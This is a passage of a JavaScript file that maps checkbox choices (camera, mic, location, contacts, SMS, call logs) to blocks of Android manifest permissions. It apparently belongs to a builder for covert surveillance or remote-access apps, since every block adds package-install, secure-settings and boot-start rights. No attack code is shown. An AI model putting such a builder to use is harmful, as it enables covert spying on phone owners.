            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
